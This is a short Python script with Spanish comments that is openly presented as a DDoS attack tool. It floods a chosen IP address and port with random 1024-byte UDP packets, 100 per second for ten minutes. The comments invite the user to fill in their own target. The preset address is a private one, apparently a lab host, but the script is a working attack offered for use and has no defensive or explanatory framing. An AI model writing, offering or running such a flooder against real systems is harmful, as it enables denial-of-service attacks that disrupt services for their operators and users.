import socket
import random
import time

# Configuración de la dirección IP y puerto del objetivo
target_ip = "10.10.10.251"  # Aquí debes colocar la dirección IP de tu objetivo
target_port = 80  # Puerto que deseas atacar (por ejemplo, el puerto HTTP)

# Configuración del tiempo de duración del ataque y la tasa de solicitud por segundo
duration = 600  # Duración del ataque en segundos
requests_per_second = 100  # Número de solicitudes por segundo

# Crear un socket UDP
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generar paquetes de datos aleatorios para enviar al objetivo
def generate_packet():
    return random._urandom(1024)  # Generar un paquete de datos aleatorio de 1024 bytes

# Ejecutar el ataque durante el tiempo especificado
print("Iniciando ataque DDoS...")
start_time = time.time()
while time.time() - start_time < duration:
    for i in range(requests_per_second):
        udp_socket.sendto(generate_packet(), (target_ip, target_port))
        print(f"Solicitud enviada ({i+1}/{requests_per_second})")
    time.sleep(1)

# Cerrar el socket después de terminar el ataque
udp_socket.close()
print("Ataque DDoS completado.")
